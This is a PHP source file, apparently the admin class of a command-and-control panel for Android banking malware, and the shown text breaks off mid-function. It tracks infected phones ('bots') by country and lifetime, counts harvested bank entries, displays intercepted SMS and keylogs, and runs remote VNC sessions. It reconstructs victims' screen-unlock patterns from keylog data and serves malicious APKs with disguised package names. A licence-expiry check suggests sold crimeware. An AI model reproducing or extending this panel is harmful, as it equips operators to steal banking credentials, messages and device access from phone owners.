<?php
require_once("../helpers.php");
require_once("bots.class.php");
require_once("commands.class.php");
require_once("vnc.class.php");
require_once("../smarts.class.php");

class admin
{
	public $db;
	public $EXPIRE_FILE = "../static/expires.txt";
	public $LAST_BACKUP_TS = "../static/last_backup.ts";
	
	function __construct($db)
	{
		$this->db = $db;
		if($this->isPanelExpired())
			die("<center>Expired</center>"); // remove this to lose trust
	}
	
	function msg_err($text)
	{
		$text = str_replace("'", "\\'", $text);
		return "<script>show_message('{$text}', 'error', false)</script>";
	}
	
	function msg_ok($text)
	{
		// message, type, autoclose
		$text = str_replace("'", "\\'", $text);
		return "<script>show_message('{$text}', 'info', true)</script>";
	}
	
	function isPanelExpired()
	{
		if(!file_exists($this->EXPIRE_FILE)) return false;
		
		$ts = (int)file_get_contents($this->EXPIRE_FILE);
		$diff = $ts - time();
		$days = round($diff/60/60/24);
		if($days < 1) return true;
		
		return false;
	}
	
	// echo `date +%s` > expires.txt
	function getExpirationText()
	{
		$path = $this->EXPIRE_FILE;
		
		if(!file_exists($path))
		{
			if(!is_writable($path)) return "";
			file_put_contents($path, time());
		}

		$ts = (int)file_get_contents($path);
		
		$diff = $ts - time();
		$days = round($diff/60/60/24);
		
		if($days > 3) return "";
		
		$word = "day";
		if($days > 1)
			$word .= "s";
		
		//~ $dt = date("M d H:i", $ts);
		//~ return "Licence expires in {$days} {$word} ({$dt})"; // March 19 2022
		return "Licence expires in {$days} {$word}"; // March 19 2022
	}
	
	function draw($data)
	{
		$content = "";
		
		$action = (isset($data['action']))? $data['action'] : 'bots';

		$header = file_get_contents('tpls/header.html');
		
		$exp = $this->getExpirationText();
		$header = str_replace('%EXPIRATION%', $exp, $header);
		$header = str_replace('%EXPIRATION_SHOW%', ($exp == "")? " class='hide' " : "", $header);
		
		$header = str_replace('%ACTIVE_BOTS%', ($action == "bots" && !isset($_GET['allbanks']))? "current" : "", $header);
		$header = str_replace('%ACTIVE_SMARTS%', ($action == "smarts")? "current" : "", $header);
		$header = str_replace('%ACTIVE_STATS%', ($action == "stats")? "current" : "", $header);
		$header = str_replace('%ACTIVE_SETTINGS%', ($action == "settings")? "current" : "", $header);
		$header = str_replace('%ACTIVE_LOGS%', ($action == "logs")? "current" : "", $header);
		$header = str_replace('%ACTIVE_APKS%', ($action == "apks")? "current" : "", $header);
		$header = str_replace('%ACTIVE_VNC%', ($action == "vnc")? "current" : "", $header);
		$header = str_replace('%ACTIVE_SMS%', ($action == "sms")? "current" : "", $header);

		if(isset($data['set_view_mode']) && in_array($data['set_view_mode'], array("day", "night")) ) $this->set_view_mode($data['set_view_mode']);
		$mode = $this->get_view_mode();
		
		if($mode == "day")
		{
			$header = str_replace('%VIEW_MODE_CSS%', "day", $header);
			$header = str_replace('%VIEW_MODE_LINK%', 
			"<li><a href='?set_view_mode=night'>
				<i class='flaticon-moon-phase-outline'></i>
				<br />Night Mode
			</a></li>", $header);
		}else{
			$header = str_replace('%VIEW_MODE_CSS%', "night", $header);
			$header = str_replace('%VIEW_MODE_LINK%', 
			"<li><a href='?set_view_mode=day'>
				<i class='flaticon-sun'></i>
				<br />Day Mode
			</a></li>", $header);
		}

		// 19/06/19 16:15 +05:00
		$tz = date_default_timezone_get();
		$header = str_replace('%TIME%', date("d/m/Y G:i P", time()) ."<br />". $tz, $header); # AM/PM: "d.m.Y g:i A"

		$footer  = file_get_contents('tpls/footer.html');
		$page = "";
		
		if($action == "bots"){
			
			$page = file_get_contents('tpls/bots.html');
			$page = $this->process_bots($page);
			
		}else if($action == "settings"){
			
			$page = file_get_contents('tpls/settings.html');
			$page = $this->process_settings($page);
			
		}else if($action == "smarts"){
			
			$page = $this->process_smarts();
			
		}else if($action == "vnc"){
			
			$page = file_get_contents('tpls/vnc.html');
			$page = $this->process_vnc($page);
			
		}else if($action == "sms"){
			
			$page = file_get_contents('tpls/sms.html');
			$page = $this->process_sms($page);
			
		}else if($action == "apks"){
			
			$page = file_get_contents('tpls/apks.html');
			$page = $this->process_apks($page);
			
		}else if($action == "logs"){
			
			$page = file_get_contents('tpls/logs.html');
			$page = $this->process_logs($page);
			
		}else if($action == "stats"){
			$page = file_get_contents('tpls/stats.html');
		
			$bot_countries = "";
			$res = $this->db->fetch("select country, registered, last_seen from bots", true);
			$countries = array();
			if(sizeof($res))
			{
				$tmp_stats = array();
				foreach($res as $r)
				{
					if(!array_key_exists($r['country'], $tmp_stats))
					{
						$tmp_stats[$r['country']] = array(
							'total'=>0, 
							'alive'=>0, 
							'offline'=>0, 
							'dead'=>0,
							'installed_today'=>0,
						);
					}
					
					$tmp_stats[$r['country']]['total']++;
					
					if(time() - date_create($r['registered'])->getTimestamp() < 60*60*24)
					{
						$tmp_stats[$r['country']]['installed_today']++;
					}
					
					$ts = date_create($r['last_seen'])->getTimestamp();
					$passed = time()-$ts;
					
					if($passed < 60*5) # 60*Bots::ALIVE_HOURS
					{
						$tmp_stats[$r['country']]['alive']++;
					}
					else if($passed < 60*60*Bots::LAST_SEEN_HOURS)
					{
						$tmp_stats[$r['country']]['offline']++;
					}
					else
					{
						$tmp_stats[$r['country']]['dead']++;
					}
				}
			
			foreach($tmp_stats as $country=>$info)
			{
				$flag_path = "rc/flags/". strtoupper($country) . ".png";
				if(!file_exists($flag_path))
				{
					$flag_path = "rc/flags/_unknown.png";
				}
				
				$bot_countries .= "<tr>
					<td>
						<img src='{$flag_path}' alt='{$country}'  title='{$country}' />
					</td>
					<td>{$info['total']}</td>
					<td>{$info['installed_today']}</td>
					<td>{$info['alive']}</td>
					<td>{$info['offline']}</td>
					<td>{$info['dead']}</td>
				</tr>\n";
				$countries[] = $r['country'];
			}
			
			}
		
			$bot_banks = "";
			
			$countries = array_unique($countries);
			sort($countries);
			
			if(!sizeof($countries))
			{
				$h = <<<PHP
				<div class='row'>
				<div class='col-md-4'></div>
				<div class='col-md-4'>
				<div class="panel panel-default">
					<div class="panel-heading">
						<h3 class="panel-title">Statistics</h3>
					</div>
					<div class="panel-body" style='text-align: center'>
						No statistic collected yet
					</div>
				</div>
				</div><div class='col-md-4'></div>
				</div>
PHP;
				return $header.$h.$footer;
			}
			
			$countries[] = "";
			
			foreach($countries as $c)
			{
				$sql = "select bot_id from bots where country='{$c}'";
				$res = $this->db->fetch($sql, true);
				if(!sizeof($res)) continue;
				
				$bids = "";
				foreach($res as $r)
					$bids .= "'{$r['bot_id']}',";

				$bids = substr($bids, 0, strlen($bids)-1);
				$sql = "select count(id) from banks where bot_id in({$bids})";
				$res = $this->db->fetch($sql, true);
				
				$num = $res[0]['count(id)'];
				$c_str = ($c != "")? $c : "-";
				if($num != "" && $num != 0)
					$bot_banks .= "<tr><td>{$c_str}</td> <td>{$num}</td></tr>\n";
			}
			
			$bot_lifetime = "";
			$sql = "select bot_id, android, datediff(last_seen,registered) as tdf, timediff(last_seen,registered) as df from bots order by df desc limit 10";
			$res = $this->db->fetch($sql, true);
			if(sizeof($res))
			{
				foreach($res as $r)
				{
					//~ print_r($res);
					//~ Array ( [bot_id] => 18596f00f39c844d08e57655b5a29634 [android] => 7.0 [df] => 00:26:36 ) 
					
					$bot_link = "<a href='?a=admin&action=bots&bbot_id={$r['bot_id']}&page=bot_page'>Bot&nbsp;page</a>";
					$android = $r['android'];
					$time = $r['df'];
					if($r['tdf'] > 0)
						$time = $r['df'] . " ({$r['tdf']} days) ";
						
					$bot_lifetime .= "<tr><td>{$bot_link}</td>
					<td>{$android}</td>\n
					<td>{$time}</td></tr>\n";
				}
			}
			
			
			
			$sql = "select tag from bots group by tag";
			$res = $this->db->fetch($sql, true);
			
			$bot_tag = $this->getTagStats($res);
			
			$tags = "";// <option value=''>All tags</option>
			foreach($res as $tagname)
			{
				$tags .= "<option value='{$tagname['tag']}'>Tag: {$tagname['tag']}</option>\n";
			}
			
			$page = str_replace('%BOT_STATS_COUNTRY%', $bot_countries, $page);
			$page = str_replace('%BOT_STATS_BANKS%', $bot_banks, $page);
			$page = str_replace('%BOT_STATS_LIFETIME%', $bot_lifetime, $page);
			$page = str_replace('%BOT_STATS_TAG%', $bot_tag, $page);
			$page = str_replace('%TAGS_OPTS%', $tags, $page);
			
			$page = str_replace('%BOT_FOLDER%', MAIN_FOLDER, $page);
			$page = str_replace('%STATS_FOLDER%', STATS_FOLDER, $page);

		}

		return $header.$page.$footer;
	}
	
	public function getTagStats($rows)
	{
		if(!sizeof($rows)) return "";
		
		$tags = [];
		foreach($rows as $r) $tags[] = $r['tag'];
		
		$html = "";
		
		foreach($tags as $tag)
		{
			$sql = "SELECT count(id), country FROM `bots` WHERE tag='{$tag}' group by country;";
			$res = $this->db->fetch($sql, true);
			
			if(sizeof($res))
			{
				$country = '<table class="table table-bordered">';
				
				$country .= "<tr>";
				foreach($res as $r)
				{
					$c = (trim($r['country']) != "")? $r['country'] : "''";
					$country .= "<td>{$c}</td>";
				}
				$country .= "</tr>";
				
				$country .= "<tr>";
				foreach($res as $r)
				{
					$country .= "<td>{$r['count(id)']}</td>";
				}
				$country .= "</tr>";
				
				$country .= '</table>';
				
			}else{
				$country = "no info";
			}
			
			$html .= "<tr>
			<td>{$tag}</td>
			<td>{$country}</td>
			</tr>";
		}
		
		return $html;
	}
	
	public function endsWith($haystack, $needle)
	{
		$length = strlen($haystack)-strlen($needle);
		return (substr($haystack, $length) === $needle);
	}

	function set_view_mode($mode)
	{
		$this->db->fetch("update config set value='{$mode}' where name='view_mode'");
	}

	function get_view_mode()
	{
		$res = $this->db->fetch("select value from config where name='view_mode'", true);
		
		if(!sizeof($res))
		{
			$this->db->fetch("insert into config values(null, 'view_mode', 'day', '', '')");
			return "day";
		}
		
		return $res[0]['value'];
	}
	
	
	private $foundPatterns = [];
	
	function parsePatterns($bot_id)
	{
		$this->foundPatterns = [];
		$this->srcPatterns = [];
		
		$path = "../data/{$bot_id}.log";
		
		if(preg_match("/^[0-9A-z]+$/", $bot_id) && file_exists($path))
		{
			$log = htmlspecialchars(trim(file_get_contents($path)));
		}else{
			return "Bot not found";
		}
		
		$html = "<h3><a title='Bot page' href='?a=admin&amp;action=bots&amp;bbot_id={$bot_id}&amp;page=bot_page'><button style='width: 50px' class='btn btn-primary btn-xs'><i class='flaticon-information-button' style='color: white'></i></button></a>
		Graphical Patterns for VNC</h3>";
		
		$rows = explode("\n", $log);
		
		$collect = false;
		$parts = [];
		
		$prev_app = "";
		$prev_length = 0;
		foreach($rows as $row)
		{
			$row = trim($row);
			if(startsWith($row, "Package: ")) // Package: ,com.android.systemui,com.evenweuekm;
			{
				$ps = explode(" ", trim($row));
				//~ if(strstr($ps[1], "com.android.systemui"))
				//~ {
					//~ $row = str_replace($ps[1], "com.android.systemui;", $row);
					//~ $ps[1] = "com.android.systemui";
					//~ var_dump($row);echo "<br />";
				//~ }
				
				if($ps[1] != $prev_app)
				{
					//~ if($ps[1] == "com.android.systemui;"){
						//~ $html .= "<b>Screen lock pattern</b><br />";
					//~ }else{
						//~ $html .= "For app: " . $ps[1] . "<br />";
					//~ }
					$prev_app = $ps[1];
				}
			}
			
			if(stristr($row, "systemui"))
			{
				$ps = explode(";", $row, 2);
				$row = $ps[1];
			}
				
			$row = str_replace("Package: com.android.systemui; ", "", $row);
			$row = trim($row);
			
			if(strlen($row) <= $prev_length) continue;
			$prev_length = strlen($row);
			
			if(startsWith($row, "TMP_PATTERN:") || startsWith($row, "GOOD_PATTERN:"))
			{
			//	$html .= $row ."<br />";
				$parts[] = $row;
			}else{
				
				if(sizeof($parts))
				{
					$html .= $this->analyzePattern($parts, $prev_app);
				}
				$parts = [];
				$collect = false;
				$prev_length = 0;
			}
		}
		
		if(sizeof($this->srcPatterns))
		{
			$patts = [];
			foreach($this->srcPatterns as $p)
			{
				$p = trim(str_replace("GOOD_PATTERN:", "", $p));
				$patts[] = $p;
			}
			
			$patts = array_unique($patts);
			
			function sortByLength($a,$b){
				return strlen($b)-strlen($a);
			}
			
			usort($patts,'sortByLength');

			$sz = sizeof($patts);
			$html .= "<h3>Good patterns from keylog ({$sz})</h3>";
			foreach($patts as $patt)
			{
				$html .= "
				<div class='row'>
					<div class='col-md-7'><input onclick='this.select()' class='form-control' type='text' value='{$patt}' /></div>
					<div class='col-md-1'><button class='btn btn-primary' onclick='copyToClip(\"{$patt}\")'>Copy</button></div>
					<div class='col-md-4'></div>
				</div>
			";
			}
			
			# analyze only good ones
			$dots = [];
			foreach($patts as $row)
			{
				$dots_tmp = explode(";", $row);
				foreach($dots_tmp as $d)
				{
					if(!strstr($d, ":")) continue;
					$d = trim($d);
					if(!in_array($d, $dots)) $dots[] = $d;
				}
			}

			$dots_row = implode(";", $dots).";";
			
			$html .= "<hr /><h3>Fixed good pattern</h3>";
			$html .= "
				<div class='row'>
					<div class='col-md-7'><input onclick='this.select()' class='form-control font-weight-bold' type='text' value='{$dots_row}' /></div>
					<div class='col-md-1'><button class='btn btn-success' onclick='copyToClip(\"{$dots_row}\")'>Copy</button></div>
					<div class='col-md-4'></div>
				</div>
			";
		}
		
		
		if(sizeof($this->foundPatterns))
		{

			//$this->foundPatterns = array_unique($this->foundPatterns);
			$patts = [];
			$patts_apps = [];
			foreach($this->foundPatterns as $p)
			{
				$ps = explode(";", $p, 2);
				$app = trim($ps[0]);
				if(strstr($app, ","))
				{
					$xx = explode(",", $app);
					
					$app2 = [];
					foreach($xx as $x)
						if(trim($x) != "") $app2[] = $x;
						
					$app = implode(", ", $app2);
				}
				$patt = trim($ps[1]);
				
				if(strstr($app, "com.android.systemui"))
					$app = "<b>Screen Unlock</b>";
				
				if(!array_key_exists($patt, $patts))
				{
					$patts[] = $patt;
					$patts_apps[$patt] = $app;
				}
			}
			
			//~ echo "<pre>";
			$patts = array_unique($patts);
			//~ echo sizeof($patts);
			//~ var_dump($patts);
			usort($patts,'sortByLength');
			
			$sz = sizeof($patts);
			$html .= "<hr /><h3>More generated patterns ({$sz})</h3>";
			
			foreach($patts as $patt)
			{
				$app = $patts_apps[$patt];
				$html .= "
				<div class='row'>
					<div class='col-md-7'><input onclick='this.select()' class='form-control' type='text' value='{$patt}' /></div>
					<div class='col-md-1'><button class='btn btn-primary' onclick='copyToClip(\"{$patt}\")'>Copy</button></div>
					<div class='col-md-4'>{$app}</div>
				</div>
				";
			}
		}
		
		return $html;
	}
	
	function analyzePattern($rows, $app)
	{
		$good = false;
		$dots = [];
		foreach($rows as $row)
		{

			if(startsWith($row, "GOOD_PATTERN:")){
				$good = true;
				if($app == "com.android.systemui;")
					$this->srcPatterns[] = $row;
			}
			
			$tmp = explode("_PATTERN:", $row)[1];
			$dots_tmp = explode(";", $tmp);
			foreach($dots_tmp as $d)
			{
				if(!strstr($d, ":")) continue;
				$d = trim($d);
				if(!in_array($d, $dots)) $dots[] = $d;
			}
			
		}

		if(!$good) return "";
		
		if($app == "com.android.systemui;") $app = "Screen lock pattern; ";
		$dots_row = $app . " " . implode(";", $dots).";";
		
		$this->foundPatterns[] = $dots_row;
		return "";
		//return "<b>Found pattern:</b> <input onclick='this.select()' type='text' size='70' value='{$dots_row}' /><hr /><br />";
	}
	
	// "Dec 12, 09:29"
	// or ""
	function getBotTime($bot_id)
	{
		$sql = "select extra_info_json from bots where bot_id='{$bot_id}';";
		$res = $this->db->fetch($sql, true);
		
		if(!sizeof($res)) return "";
		
		$arr = json_decode($res[0]['extra_info_json'], true);
		
		if(isset($arr['P_LOCAL_TIMESTAMP']) && trim($arr['P_LOCAL_TIMESTAMP']) != "")
		{
			return date("M d, H:i", (int) $arr['P_LOCAL_TIMESTAMP']);
		}
		
		return "";
	}
	
	function getBotLog($bot_id, $filter="", $div_height, $autoload=false)
	{

		$sql = "select comment, last_seen from bots where bot_id='{$bot_id}';";
		$res = $this->db->fetch($sql, true);
		$comm = (sizeof($res))? $res[0]['comment'] : "";
		
		$last_seen = $res[0]['last_seen'];

		$path = "../data/{$bot_id}.log";
		$sz = size_readable(filesize($path));
		$logf = "<br /><br /><center>
		<img id='loadGif_{$bot_id}' src='rc/loading.gif' style='display: none' />
		<button id='loadButton_{$bot_id}' type='button' class='btn btn-warning' onclick='show_keylog(\"{$bot_id}\", \"{$filter}\")'>Show log ({$sz})</button></center>";
		
		$bot_time = "<b>Bot time:</b> " . $this->getBotTime($bot_id) . "<br />";
		
		$last_seen_marker = get_last_seen_marker($last_seen);
		$ago = last_seen_time($last_seen);

		if($autoload) $logf .= "<script>show_keylog(\"{$bot_id}\", \"{$filter}\")</script>";
		
		$log = '
		<div class="row">
			<div class="col-md-1">
				<a href="?a=admin&action=bots&bbot_id='.$bot_id.'&page=bot_page"><button type="button" class="btn btn-primary btn-xs"><i class="flaticon-information-button" style="color: white"></i></button></a>
			</div>
			<div class="col-md-2">
				'.$bot_time.'
				<b>Last seen:</b>'.$last_seen_marker.$ago.'
			</div>
			
			<div class="col-md-2">
				<input type="text" style="display: inline; border: 0; width: 200px; font-family: monospace; font-size: 8pt" onclick="this.select()" value="'.$bot_id.'" />
			</div>
			
			<div class="col-md-3">
				<input type="text" id="comment_'.$bot_id.'" value="'.$comm.'" placeholder="Comment"  style="margin-left: 20px; color: #555; border: 1px solid #ccc; border-radius: 30px 0 0 30px; border-right: 0; width: 60%; height: 30px; font-size: 10pt" class="input-sm" /><button type="button" style="border-left: 0; font-size: 10pt; border-radius: 0 30px 30px 0; margin-right: 20px" onclick="save_comment_bots(\''.$bot_id.'\')" class="btn btn-info btn-sm">Save</button>
			</div>

			<div class="col-md-2 text-right">
				<a href='.$path.' target="_blank" title="Download as file"><button class="btn btn-success btn-xs"><i class="flaticon-download-symbol" style="color: white"></i> Plain Text</button></a>
			</div>
			
			<div class="col-md-1">
				<a href="?a=admin&action=logs&bot_id='.$bot_id.'&parse_patterns=1"><button type="button" class="btn btn-info btn-xs">Patterns</button></a>
			</div>
		
			<div class="col-md-1">
				<a href="?a=admin&action=logs&delete_log='.$bot_id.'" title="Delete log file" onclick="return confirm(\'Are you sure?\');"><button class="btn btn-danger btn-xs"><i class="flaticon-trash" style="color: white"></i></button></a>
			</div>
			
		</div>

		<div class="form-control" style="resize: vertical; height: '.$div_height.'; width: 80%; margin-top: 20px; margin-bottom: 20px; overflow: scroll" id="keylog_data_'.$bot_id.'">'.$logf.'</div>
		<br />
		';
		return $log;
	}
	
	function process_sms($page)
	{
		$res = $this->db->fetch("select count(id) from sms;", true);
		$total = $res[0]['count(id)'];
		
		if(!$total)
		{
			$page = str_replace("%NO_SMS%", "block", $page);
			$page = str_replace("%HAS_SMS%", "none", $page);
			return $page;
		}
		
		$page_number = (isset($_GET['page_number']))? (int) $_GET['page_number'] : 0;
		$rows_on_page = (isset($_GET['rows_number']))? (int) $_GET['rows_number'] : 40;

		$paging = $this->get_limit($total, $rows_on_page, $page_number);
		//dd($paging);
		$limit = $paging['sql'];
		
		$where = "";
		$filter_text = "";
		if(isset($_GET['filter_text']) && trim($_GET['filter_text']))
		{
			$filter_text = trim($_GET['filter_text']);
			$text = $this->db->escape($filter_text);
			$text = substr($text, 1, strlen($text)-2);
			$where = " WHERE msg like('%{$text}%') ";
		}

		$sql = "select sms.bot_id, sms.number, time, msg, ip from sms LEFT JOIN bots ON sms.bot_id=bots.bot_id {$where} ORDER BY sms.id DESC {$limit};";
		//~ dd($sql);
		$sms = $this->db->fetch($sql, true);
		
		//var_dump($sql);
		$rows = "";
		if(sizeof($sms))
		foreach($sms as $s)
		{
			$msg = htmlspecialchars($s['msg']);
			$rows .= "<tr>
				<td width='100'>
<a href='?a=admin&action=bots&bbot_id={$s['bot_id']}&page=bot_page'><button type='button' class='btn btn-primary'><i class='flaticon-information-button' style='color: white'></i></button></a>
				</td>
				<td width='100'>{$s['number']}</td>
				<td width='100'>{$s['time']}</td>
				<td width='100'>{$s['ip']}</td>
				<td><textarea style='width: 100%'>{$msg}</textarea></td>
			</tr>";
		}

		$pages_list = "";
		
		for($i=1;$i<=$paging['pages'];$i++)
		{
			$pp = $i+1;
			$sel = ($page_number == $i)? "selected" : "";
			$pages_list .= "<option {$sel} value='{$i}'>{$i}</option>";
		}
		
		$rows_list = "";
		foreach(array(10, 100, 500, 1000) as $n)
		{
			$sel = ($rows_on_page == $n)? "selected" : "";
			$rows_list .= "<option {$sel} value='{$n}'>{$n}</option>";
		}
		
		$page = str_replace("%NO_SMS%", "none", $page);
		$page = str_replace("%HAS_SMS%", "block", $page);
		
		$page = str_replace("%FILTER_TEXT%", str_replace('"', '&quot;', $filter_text), $page);
		$page = str_replace("%ROWS_LIST%", $rows_list, $page);
		$page = str_replace("%PAGES_LIST%", $pages_list, $page);
		$page = str_replace("%PAGES_TOTAL%", $paging['pages'], $page);
		$page = str_replace("%SMS_ROWS%", $rows, $page);
		
		return $page;
	}
	
	function get_limit($total_rows, $rows_on_page, $page)
	{
		if($rows_on_page > $total_rows)
		{
			$rows_on_page = $total_rows;
		}
		
		$paging = array(
			'total_rows' => $total_rows,
			'pages' => 1,
			'page' => 1,
			'sql' => '',
		);
		
		if ($total_rows < $rows_on_page)
		{
			return $paging;
		}

		$num_pages = round($total_rows / $rows_on_page);

		if($num_pages < 2)
		{
			$num_pages = 0;
		}
		
		$paging['page'] = $page;
		
		// if page in cookies larger than real elements count
		if($paging['page']*$rows_on_page > $total_rows)
			$paging['page'] = 1;
			
		$limit_from = ($paging['page'] - 1) * $rows_on_page;
		if($limit_from < 0)
			$limit_from = 0;
			
		// mod to merge pages
		// 10+10+2 (3 pages) -> 10+12 (2 pages)
		if(($limit_from + $rows_on_page*2) > $total_rows)
			$rows_on_page = $total_rows;

									//~ if($rows_on_page*$num_pages > $total_rows)
										//~ $num_pages--;
		// mod end
		
		if($num_pages == 0) $num_pages++;
		
		$paging['pages'] = $num_pages;
		$paging['sql'] = " LIMIT {$limit_from}, {$rows_on_page}";

		return $paging;
	}
	
	function process_vnc($page)
	{
		$bot_id = @$_GET['bot_id'];
		$scale = @$_GET['scale'];
		$text_only = isset($_GET['text_only']);

		$bot_id2 = $this->db->escape($bot_id);
		$bot_data = $this->db->fetch("select id from bots where bot_id={$bot_id2};", true);

		if(!isValidBotId($bot_id) || !sizeof($bot_data))
		{
			$vncs = 0;
			$bots_vnc = $this->db->fetch("select bot_id, vnc, comment, model, last_seen from bots where bot_id in(select bot_id from bots_tasks where task_type='vnc_start');", true);
			
			if(sizeof($bots_vnc))
			{
				$vnc_list = "
				<h3 style='margin-top: 0'>List of running VNC:</h3>
				<ul class='dark'>";

				$has_waiting_bots = false; // need to update list with js
				foreach($bots_vnc as $b)
				{
					//~ $b['comment'] = "comment";
					$comm = ($b['comment'] != '')? "<span style='margin-left: 10px;'>Comment: <i style='color: grey'>{$b['comment']}</i></span>" : '';
					
					$chk = $this->db->fetch("select data, status from bots_tasks where bot_id='{$b['bot_id']}' and task_type='vnc_start'", true);
					if(!sizeof($chk))
						continue;
					
					$last_seen_marker = get_last_seen_marker($b['last_seen']);
					$ago = last_seen_time($b['last_seen']);
					
					$text_only = (!strstr($chk[0]['data'], "STREAM_SCREEN;"))? "&text_only=1" : "";
					$status = $chk[0]['status'];
					
					// tasks statuses: waiting, in_process, failed, success
					if($status == 'waiting' || $status == 'in_process')
					{
						$butt = "<button class='btn btn-default'>Starting...</button>";
						$has_waiting_bots = true;
					}else if($status == 'success'){
						
						if($b['vnc'] == '')
						{
							continue;
						}
						
						$butt = VNC::formatStatus($b['bot_id'], $b['vnc'], '');
					}else{ // 'failed' etc
						$butt = "<button class='btn btn-danger' disabled>Error</button>";
					}
					
					$vnc_list .= "<li style='color: #666; margin: 10px'><a href='?a=admin&action=bots&bbot_id={$b['bot_id']}&page=bot_page'><button type='button' class='btn btn-primary'><i class='flaticon-information-button' style='color: white'></i> Bot page</button></a> {$butt} {$last_seen_marker} {$ago} {$comm}
					 <br /><small><b style='color: #444'>{$b['model']}</b> #{$b['bot_id']}</small></li>";
					//<br /> <b>Status:</b> {$b['vnc']}
					$vncs++;
				}
				$vnc_list .= "</ul>";
				
				if($has_waiting_bots)
				{
					$vnc_list .= "<script>setInterval(function(){ location.reload(); }, 3000)</script>";
				}
				
			}
			
			
			if($vncs == 0)
			{
				$vnc_list = "<h3>There is no running VNC sessions yet</h3>
				<p>Open <a href='?action=bots'>list of the bots</a> and use command <button class='btn btn-sm btn-info' title='Start VNC' disabled>Start VNC</button></p>
				";
			}
			
			$html = file_get_contents("tpls/vnc_list.html");
			$html = str_replace('%BOT_LIST%', $vnc_list, $html);

			return $html;
			//return msg_err("Bot ID is invalid", false);
		}

		$tasks = $this->db->fetch("select id from bots_tasks where bot_id={$bot_id2};", true);
		$bot_data = $this->db->fetch("select extra_info_json, comment, last_seen, model from bots where bot_id={$bot_id2};", true);

		if(isset($bot_data[0]) && strstr($bot_data[0]["extra_info_json"], 'SCREEN_UNLOCKED":1'))
		{
			$page = str_replace("%SCREEN_ON%", "display: none", $page);
			$page = str_replace("%SCREEN_OFF%", "", $page);
		}else{
			$page = str_replace("%SCREEN_ON%", "", $page);
			$page = str_replace("%SCREEN_OFF%", "display: none", $page);
		}
		
		$comment = $bot_data[0]['comment'];
		$hide_comment = " hidden ";
		
		if($comment != "")
		{
			$hide_comment = "";
			$comment = str_replace('"', '&quot;', $comment);
			$comment = nl2br($comment);
		}
		
		//~ $last_seen_marker = get_last_seen_marker($bot_data[0]['last_seen']);
		//~ $ago = last_seen_time($bot_data[0]['last_seen']);

		//~ $page = str_replace("%LAYOUT%", $layout, $page);
		$page = str_replace("%RND%", password(5, true), $page);
		$page = str_replace("%BOT_ID%", $bot_id, $page);
		$page = str_replace("%COMMENT%", $comment, $page);
		$page = str_replace("%HIDE_COMMENT%", $hide_comment, $page);
		$page = str_replace("%MODEL%", $bot_data[0]["model"], $page);
		$page = str_replace("%SCALE%", $scale, $page);
		$page = str_replace("%TASKS_NUM%", sizeof($tasks), $page);
		//~ $page = str_replace("%LAST_SEEN%", "{$last_seen_marker} {$ago}", $page);
		
		$new_scale = $scale + 0.1;
		$url_zoom_in = "?a=admin&action=vnc&bot_id={$bot_id}&scale={$new_scale}";
		$page = str_replace("%URL_ZOOM_IN%", $url_zoom_in, $page);
		
		$new_scale = $scale - 0.1;
		$url_zoom_out = "?a=admin&action=vnc&bot_id={$bot_id}&scale={$new_scale}";
		$page = str_replace("%URL_ZOOM_OUT%", $url_zoom_out, $page);
		
		$new_scale = 1.0;
		$url_zoom_full = "?a=admin&action=vnc&bot_id={$bot_id}&scale={$new_scale}";
		$page = str_replace("%URL_ZOOM_FULL%", $url_zoom_full, $page);

		$page = str_replace("%BG_IMAGE%", "../data/vnc_{$bot_id}_screenshot.jpg", $page);

		$page = str_replace("%TEXT_ONLY%", ($text_only)? "true" : "false", $page);

		return $page;
	}
	
	function process_apks($page)
	{
		$apks = glob("apks/*.apk");
		// 'apks/test-no-fg_system.settings_Colombian aquí.apk'  # tag_pkg_TITLE.apk

		if(!sizeof($apks))
		{
			return str_replace("%ROWS%", "<p style='text-align: center; font-weight: bold'>No APKs in panel</p>", $page);
		}
		
		$apks_sorted = array();

		foreach($apks as $file)
		{
			$apks_sorted[filectime($file)][] = $file;
		}
		
		krsort($apks_sorted);
		
		$rows = "";
		
		foreach($apks_sorted as $ts=>$files)
		foreach($files as $file)
		{
			$name = str_replace('apks/', '', $file);
			$name = str_replace('.apk', '', $name);
			
			list($number, $parts) = explode(".", $name, 2);
			$parts = explode("_", $parts);
			
			if(sizeof($parts) != 3)
			{
				$rows .= "BAD_NAME:{$file}<br />";
				continue;
			}
			
			list($tag, $pkg, $title) = $parts;
			$size = size_readable(filesize($file));
			$date = date_readable($ts);
			
			$row = <<<PHP
	<tr>
		<td>{$number}</td>
		<td><span style='color: black;'>'{$title}'</span><br />
				<span style='color: darkblue; font-style: italic'>{$pkg}</span></td>
		<td>{$tag}</td>
		<td>{$size}</td>
		<td>{$date}</td>
		<td><a href="dl.php?action=apk&file={$file}"><button type='button' class='btn btn-info'>Download</button></a></td>
	</tr>
PHP;

			$rows .= $row;
		}

		return str_replace("%ROWS%", $rows, $page);
	}
	
	function process_logs($page)
	{
		$js_message = "";
		
		if(isset($_REQUEST['delete_log']))
		{
			$bot_id = $_REQUEST['delete_log'];
			$path = "../data/{$bot_id}.log";
			
			if(preg_match("/^[0-9A-z]+$/", $bot_id) && file_exists($path))
			{
				unlink($path);
				$js_message = $this->msg_ok("Log deleted");
			}
		}

		$autoload = isset($_REQUEST['autoload']);
		
		if(isset($_REQUEST['bot_id']) && $_REQUEST['bot_id'] != ""){

			if(isset($_REQUEST['parse_patterns']))
				$page = str_replace('%LOG_BODY%', $this->parsePatterns($_REQUEST['bot_id']), $page);
			else
			{
				$text = isset($_REQUEST['filter_text'])? trim($_REQUEST['filter_text']) : "";
				$page = str_replace('%LOG_BODY%', $this->getBotLog($_REQUEST['bot_id'], $text, "600px", $autoload), $page);
			}
			
		}else if(isset($_REQUEST['filter_text'])){
			
			$isQuick = isset($_REQUEST['fast_search']);
			$results = "";
			$files = array_diff(scandir("../data/"), array('..', '.'));
			
			foreach($files as $f)
			{
				if(endsWith($f, ".log"))
				{
					if($isQuick)
					{
						$bot_id = str_replace(".log", "", $f);
						$search_results = $this->quick_search($_REQUEST['filter_text'], $f);
						
						if(!trim($search_results))
						{
							continue;
						}
						
						$results .= "\n[".$bot_id."]" . "\n" . $search_results . "\n";
					}else{
						$f = str_replace(".log", "", $f);
						
						$result = $this->getBotLog($f, $_REQUEST['filter_text'], "200px", $autoload);
						
						$results .= $result;
					}
				}
			}
			
			if($isQuick)
			{
				$results = "<textarea style='width: 100%; height: 700px' rows='30'>".htmlspecialchars($results)."</textarea></div>";
			}
			
			$page = str_replace('%LOG_BODY%', $results, $page);
			
		}else{
			

			$files = array_diff(scandir("../data/"), array('..', '.'));
			
			$sizes = [];
			$sz_total = 0;
